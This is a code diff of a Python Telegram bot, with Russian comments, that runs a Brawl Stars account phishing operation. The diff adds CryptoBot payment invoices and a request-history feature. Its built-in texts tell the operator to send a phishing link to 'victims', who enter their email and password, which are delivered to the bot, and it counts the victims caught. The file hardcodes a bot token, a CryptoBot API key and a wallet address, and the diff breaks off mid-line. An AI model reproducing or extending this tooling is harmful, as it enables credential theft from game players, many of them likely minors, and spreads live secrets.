@@ -5,6 +5,7 @@ import threading
 import os
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from datetime import datetime
+from collections import deque
 
 BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
 ADMIN_ID = 8744429026
@@ -14,17 +15,63 @@ PHISHING_URL = "https://da.gd/tzO5QW"
 # Твой TON кошелёк для USDT
 TON_WALLET = "UQCCjSOpDOYPjoDK18dB7JRNSGmxqN9zacsrVQv-ftXuTjwt"
 
+# CryptoBot API ключ
+CRYPTOBOT_API_KEY = "593895:AA6NpZIKwdrRXuYYTzV4EPGYmf99j8aFKMU"
+
 last_update_id = 0
 victims = []
 user_language = {}
 tickets = {}
 admin_reply_context = {}
 pending_payments = {}
+pending_crypto_invoices = {}
+
+# Хранилище последних 5 запросов для каждого пользователя
+user_last_requests = {}
+
+# ========== ФУНКЦИИ CRYPTOBOT ==========
+def create_crypto_invoice(amount, asset="USDT"):
+    """Создаёт счёт в CryptoBot и возвращает pay_url и invoice_id"""
+    url = "https://pay.crypt.bot/api/createInvoice"
+    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_API_KEY}
+    data = {
+        "asset": asset,
+        "amount": str(amount),
+        "description": f"Donation {amount} USDT"
+    }
+    try:
+        response = requests.post(url, headers=headers, data=data)
+        result = response.json()
+        if result.get("ok"):
+            return result["result"]["pay_url"], result["result"]["invoice_id"]
+        else:
+            print(f"CryptoBot error: {result}")
+            return None, None
+    except Exception as e:
+        print(f"Error creating invoice: {e}")
+        return None, None
+
+def check_invoice_status(invoice_id):
+    """Проверяет статус счёта в CryptoBot"""
+    url = "https://pay.crypt.bot/api/getInvoices"
+    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_API_KEY}
+    data = {"invoice_ids": invoice_id}
+    try:
+        response = requests.post(url, headers=headers, data=data)
+        result = response.json()
+        if result.get("ok") and result["result"]["items"]:
+            invoice = result["result"]["items"][0]
+            status = invoice.get("status")
+            if status == "paid":
+                return True
+        return False
+    except:
+        return False
 
 # ========== ТЕКСТЫ ==========
 TEXTS = {
     'ru': {
-        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
+        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.\n\n📋 **Последние 5 запросов:**\n{last_requests}",
         'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку\n2️⃣ Жертва вводит почту и пароль\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит 404\n\n⚠️ Ссылка: {url}",
         'data_empty': "📭 **Нет данных**",
         'data_title': "👥 **Пойманные жертвы:**\n\n",
@@ -33,13 +80,11 @@ TEXTS = {
         'donate_stars': "💫 Telegram Stars",
         'donate_crypto': "₿ Криптовалюта (USDT)",
         'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
-        'donate_crypto_warning': "⚠️ **ВНИМАНИЕ!** ⚠️\n\nПереводы принимаются **ТОЛЬКО** через сеть **TON** (USDT-TON).\n\n❌ **Не используйте:** TRC20, ERC20, BEP20\n✅ **Используйте:** TON\n\n💸 **Кошелёк:**\n`{wallet}`\n\n*При ошибке выбора сети средства будут потеряны. Бот не несёт ответственности.*",
-        'donate_crypto_1': "**₿ Пожертвование 1 USDT (сеть TON)**\n\n⚠️ ТОЛЬКО СЕТЬ TON\n\n💰 Сумма: 1 USDT\n📦 Кошелёк: `{wallet}`",
-        'donate_crypto_2': "**₿ Пожертвование 2 USDT (сеть TON)**\n\n⚠️ ТОЛЬКО СЕТЬ TON\n\n💰 Сумма: 2 USDT\n📦 Кошелёк: `{wallet}`",
-        'payment_received': "✅ **Платёж получен!**\n\nПользователь @{username} перевёл {stars}⭐\n💰 Эквивалент: {rubles}₽\n🆔 Заказ: {order_id}\n\nСпасибо за поддержку! 🙌",
-        'payment_received_crypto': "📨 **Заявка на крипто-пожертвование!**\n\n👤 От: @{username} (ID: {user_id})\n💰 Сумма: {amount} USDT (TON)\n\nПроверьте кошелёк: {wallet}",
-        'crypto_sent_notify': "✅ Администратор уведомлён о вашем переводе {amount} USDT.\n\nСпасибо за поддержку! 💙",
-        'crypto_sent_admin': "✅ Заявка на {amount} USDT отправлена!",
+        'donate_crypto_invoice': "**₿ ЧЕК НА ОПЛАТУ USDT (через CryptoBot)**\n\n💰 **Сумма:** {amount} USDT\n🆔 **Номер чека:** `{invoice_id}`\n\n📌 **Инструкция:**\n1️⃣ Нажми на кнопку «Оплатить»\n2️⃣ Оплати через **@CryptoBot**\n3️⃣ После оплаты нажми «Проверить оплату»\n\n💎 После подтверждения админ получит уведомление.",
+        'payment_received': "✅ **Платёж получен!**\n\n👤 От: @{username}\n💰 Сумма: {amount} USDT\n\nСпасибо за поддержку! 🙌",
+        'payment_already_paid': "✅ Этот платёж уже был оплачен.",
+        'payment_not_found': "⏳ Платёж пока не найден. Подождите 1-2 минуты и попробуйте снова.",
+        'payment_check_error': "❌ Ошибка при проверке платежа. Попробуйте позже.",
         'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
         'lang_changed': "✅ Язык: Русский",
         'lang_changed_en': "✅ Language: English",
@@ -67,10 +112,11 @@ TEXTS = {
         'reply_btn': "✏️ Ответить",
         'closed_ticket_notify': "🔒 Пользователь закрыл тикет #{ticket_id}",
         'admin_help': "📩 **Поддержка**\n\nНажми кнопку ниже, чтобы создать тикет. Администратор ответит тебе в этом чате.",
-        'self_message_error': "❌ Вы не можете написать сами себе."
+        'self_message_error': "❌ Вы не можете написать сами себе.",
+        'creating_invoice': "🔄 Создаём платёж... Подождите."
     },
     'en': {
-        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.",
+        'start': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims:** {count}\n\n📌 Send link to victim.\n\n📋 **Last 5 requests:**\n{last_requests}",
         'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link\n2️⃣ Victim enters email/password\n3️⃣ Data comes here\n4️⃣ Victim sees 404\n\n⚠️ Link: {url}",
         'data_empty': "📭 **No data**",
         'data_title': "👥 **Victims:**\n\n",
@@ -79,13 +125,11 @@ TEXTS = {
         'donate_stars': "💫 Telegram Stars",
         'donate_crypto': "₿ Cryptocurrency (USDT)",
         'donate_sent': "✅ **Invoice created**\n\n- **Product:** 8 GB, 4 vCPU, 75 GB SSD\n- **Quantity:** 1 pc.\n\n- **To pay:** {stars} Telegram Stars\n- **Equivalent:** {rubles}₽\n- **Order number:** {order_id}\n\n**⏱ Time to pay:** 60 minutes\n\nAfter payment, the product will be delivered automatically.",
-        'donate_crypto_warning': "⚠️ **WARNING!** ⚠️\n\nPayments are accepted **ONLY** via **TON** network (USDT-TON).\n\n❌ **Do not use:** TRC20, ERC20, BEP20\n✅ **Use:** TON\n\n💸 **Wallet:**\n`{wallet}`\n\n*If you choose the wrong network, funds will be lost. The bot is not responsible.*",
-        'donate_crypto_1': "**₿ Donation 1 USDT (TON network)**\n\n⚠️ ONLY TON NETWORK\n\n💰 Amount: 1 USDT\n📦 Wallet: `{wallet}`",
-        'donate_crypto_2': "**₿ Donation 2 USDT (TON network)**\n\n⚠️ ONLY TON NETWORK\n\n💰 Amount: 2 USDT\n📦 Wallet: `{wallet}`",
-        'payment_received': "✅ **Payment received!**\n\nUser @{username} transferred {stars}⭐\n💰 Equivalent: {rubles}₽\n🆔 Order: {order_id}\n\nThank you for your support! 🙌",
-        'payment_received_crypto': "📨 **Crypto donation request!**\n\n👤 From: @{username} (ID: {user_id})\n💰 Amount: {amount} USDT (TON)\n\nCheck wallet: {wallet}",
-        'crypto_sent_notify': "✅ Admin has been notified of your {amount} USDT transfer.\n\nThank you for your support! 💙",
-        'crypto_sent_admin': "✅ Request for {amount} USDT sent!",
+        'donate_crypto_invoice': "**₿ USDT PAYMENT INVOICE (via CryptoBot)**\n\n💰 **Amount:** {amount} USDT\n🆔 **Invoice ID:** `{invoice_id}`\n\n📌 **Instructions:**\n1️⃣ Click the button below\n2️⃣ Pay via **@CryptoBot**\n3️⃣ After payment, click **Check payment**\n\n💎 Admin will be notified after confirmation.",
+        'payment_received': "✅ **Payment received!**\n\n👤 From: @{username}\n💰 Amount: {amount} USDT\n\nThank you for your support! 🙌",
+        'payment_already_paid': "✅ This payment has already been made.",
+        'payment_not_found': "⏳ Payment not found yet. Wait 1-2 minutes and try again.",
+        'payment_check_error': "❌ Error checking payment. Please try again later.",
         'settings': "⚙️ **SETTINGS**\n\nChoose language:",
         'lang_changed': "✅ Language: English",
         'lang_changed_ru': "✅ Язык: Русский",
@@ -113,7 +157,8 @@ TEXTS = {
         'reply_btn': "✏️ Reply",
         'closed_ticket_notify': "🔒 User closed ticket #{ticket_id}",
         'admin_help': "📩 **Support**\n\nPress the button below to create a ticket. Admin will answer in this chat.",
-        'self_message_error': "❌ You cannot message yourself."
+        'self_message_error': "❌ You cannot message yourself.",
+        'creating_invoice': "🔄 Creating payment... Please wait."
     }
 }
 
@@ -180,6 +225,13 @@ def get_donate_crypto_keyboard(chat_id):
         [{"text": get_button_text(chat_id, 'back'), "callback_data": "donate_menu"}]
     ]
 
+def get_crypto_invoice_keyboard(pay_url, invoice_id, amount):
+    return [
+        [{"text": f"💸 Оплатить {amount} USDT", "url": pay_url}],
+        [{"text": "✅ Проверить оплату", "callback_data": f"check_crypto_payment_{invoice_id}_{amount}"}],
+        [{"text": "🔙 Назад", "callback_data": "donate_crypto_menu"}]
+    ]
+
 def get_back_keyboard(chat_id):
     return [[{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]]
 
@@ -195,13 +247,6 @@ def get_ticket_keyboard(ticket_id):
 
 def get_admin_reply_keyboard(user_id, username, ticket_id):
     return [[{"text": "✏️ Ответить", "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
-
-def get_crypto_keyboard(amount):
-    return [
-        [{"text": f"💸 Перевести {amount} USDT", "url": f"https://app.tonkeeper.com/transfer/{TON_WALLET}?amount={amount}"}],
-        [{"text": "✅ Я оплатил", "callback_data": f"crypto_sent_{amount}"}],
-        [{"text": "🔙 Назад", "callback_data": "donate_crypto_menu"}]
-    ]
 
 def generate_ticket_id():
     return int(time.time()) % 1000000
@@ -228,6 +273,22 @@ def get_active_ticket(user_id):
         return tickets[user_id]
     return None
 
+def add_user_request(user_id, request_text):
+    """Добавляет запрос в историю последних 5 действий пользователя"""
+    if user_id not in user_last_requests:
+        user_last_requests[user_id] = deque(maxlen=5)
+    user_last_requests[user_id].append(request_text)
+
+def get_last_requests_text(user_id):
+    """Возвращает форматированный текст последних 5 запросов"""
+    if user_id not in user_last_requests or not user_last_requests[user_id]:
+        return "Нет запросов"
+    
+    result = []
+    for i, req in enumerate(user_last_requests[user_id], 1):
+        result.append(f"{i}. {req}")
+    return "\n".join(result)
+
 # ========== ВЕБ-СЕРВЕР ДЛЯ RENDER ==========
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -253,6 +314,7 @@ time.sleep(2)
 print("✅ Бот запущен на Render.com!")
 print(f"🔗 Ссылка: {PHISHING_URL}")
 print(f"👑 Администратор: @{ADMIN_USERNAME}")
+print(f"₿ CryptoBot API ключ загружен")
 
 # ========== ОСНОВНОЙ ЦИКЛ БОТА ==========
 while True:
@@ -274,7 +336,8 @@ while True:
                 if chat_id == ADMIN_ID:
                     if text == "/start":
                         user_language[chat_id] = 'ru'
-                        send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
+                        last_reqs = get_last_requests_text(chat_id)
+                        send_message(chat_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims), last_requests=last_reqs), get_main_keyboard(chat_id))
                     
                     elif chat_id in admin_reply_context and admin_reply_context[chat_id].get("waiting_reply"):
                         target_user_id = admin_reply_context[chat_id]["user_id"]
@@ -295,6 +358,10 @@ while True:
                         send_message(chat_id, "❌ У вас нет активного диалога с пользователем.")
                     
                     else:
+                        # Сохраняем запрос админа в историю
+                        if text and not text.startswith("/"):
+                            add_user_request(chat_id, text[:50] + ("..." if len(text) > 50 else ""))
+                        
                         found = False
                         for user_id, payment in list(pending_payments.items()):
                             if str(user_id) in text:
@@ -320,34 +387,4 @@ while True:
                     
                     if text == "/start":
                         user_language[chat_id] = 'ru'
-                        send_message(chat_id, 
-                            f"🎉 **Добро пожаловать!** 🎉\n\n"
-                            f"🔹 Используй кнопки ниже для связи с администратором.\n"
-                            f"🔹 По всем вопросам создавай тикет — ответят в ближайшее время.\n\n{get_text(chat_id, 'admin_help')}",
-                            get_main_keyboard(chat_id))
-                    
-                    elif text == "/close":
-                        if close_ticket(chat_id):
-                            send_message(chat_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
-                            if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
-                                admin_reply_context[ADMIN_ID] = {}
-                            send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', ticket_id=tickets.get(chat_id, {}).get("ticket_id", "?")))
-                        else:
-                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
-                    
-                    else:
-                        active_ticket = get_active_ticket(chat_id)
-                        if active_ticket:
-                            active_ticket["messages"].append({"role": "user", "text": text, "time": time.time()})
-                            
-                            forward_text = get_text(ADMIN_ID, 'user_message', user_id=chat_id, username=username, text=text, ticket_id=active_ticket["ticket_id"])
-                            reply_keyboard = get_admin_reply_keyboard(chat_id, username, active_ticket["ticket_id"])
-                            send_message(ADMIN_ID, forward_text, reply_keyboard)
-                            
-                            send_message(chat_id, "✅ Сообщение отправлено администратору. Ответ придёт сюда.")
-                        else:
-                            send_message(chat_id, get_text(chat_id, 'no_active_ticket'), get_main_keyboard(chat_id))
-
-            # Обработка нажатий на кнопки
-            if callback:
-                chat_id = ca
+                        last_reqs = get_last_requests_text(chat_id)
